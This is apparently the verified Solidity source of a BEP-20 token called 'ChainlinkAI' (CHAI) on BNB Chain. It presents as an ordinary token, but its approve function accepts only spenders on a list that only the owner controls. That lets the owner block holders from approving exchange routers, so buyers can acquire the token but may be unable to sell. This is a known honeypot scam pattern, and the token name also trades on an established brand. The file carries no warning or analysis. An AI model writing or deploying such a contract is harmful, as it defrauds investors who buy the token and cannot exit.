/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract ChainlinkAI {
    string public name = "ChainlinkAI";
    string public symbol = "CHAI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public whitelist;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event WhitelistUpdated(address indexed account, bool isWhitelisted);

    address public owner;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        whitelist[msg.sender] = true;
        owner = msg.sender;
    }

    function _safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function _safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        balanceOf[msg.sender] = _safeSub(balanceOf[msg.sender], _value);
        balanceOf[_to] = _safeAdd(balanceOf[_to], _value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(whitelist[_spender], "Only whitelisted addresses can be approved.");
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        allowance[_from][msg.sender] = _safeSub(allowance[_from][msg.sender], _value);
        balanceOf[_from] = _safeSub(balanceOf[_from], _value);
        balanceOf[_to] = _safeAdd(balanceOf[_to], _value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function updateWhitelist(address _account, bool _isWhitelisted) public {
        require(msg.sender == owner, "Only the owner can update the whitelist.");
        whitelist[_account] = _isWhitelisted;
        emit WhitelistUpdated(_account, _isWhitelisted);
    }
}